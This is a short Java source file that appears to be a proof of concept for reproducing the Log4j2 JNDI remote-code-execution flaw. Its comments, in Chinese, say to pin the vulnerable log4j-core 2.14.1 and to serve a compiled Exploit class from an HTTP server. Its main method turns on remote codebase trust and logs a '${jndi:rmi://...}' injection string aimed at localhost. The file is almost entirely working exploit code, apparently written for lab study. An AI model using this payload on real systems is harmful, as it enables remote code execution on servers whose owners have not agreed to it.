package com.cfysu.jdni.log4j;

/**
 * @Author canglong
 * @Date 2022/1/6
 */
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2RCEPoc {
    public static final Logger LOGGER = LogManager.getLogger(Log4j2RCEPoc.class);

    /**
     * https://www.freebuf.com/vuls/316143.html
     * 1.因为这个项目引入了多个日志实现。复现的时候要先排除其他jar包。保证以下jar包生效。
     * <dependency>
     *   <groupId>org.apache.logging.log4j</groupId>
     *   <artifactId>log4j-core</artifactId>
     *   <version>2.14.1</version>
     *</dependency>
     * 2.编译后的class文件要按照包路径形式，放到指定的文件夹下面。例如、${http_server_dir}/com/cfysu/log4j/Exploit.class
     */
    public static void main(String[] args) throws ClassNotFoundException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        LOGGER.error("${jndi:rmi://127.0.0.1:1099/exp}");
        //Class.forName("com.cfysu.log4j.Exploit");
    }
}
